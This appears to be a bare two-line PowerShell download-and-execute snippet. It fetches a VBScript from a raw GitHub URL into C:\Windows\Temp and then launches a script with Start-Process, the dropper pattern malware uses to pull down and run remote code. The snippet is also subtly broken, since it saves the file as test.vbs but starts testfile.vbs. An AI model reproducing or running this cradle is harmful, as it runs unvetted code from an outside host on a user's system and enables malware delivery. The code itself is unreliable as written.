(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/newuser034/powershell/main/testfile.vbs", "C:\Windows\Temp\test.vbs")
Start-Process "C:\Windows\Temp\testfile.vbs"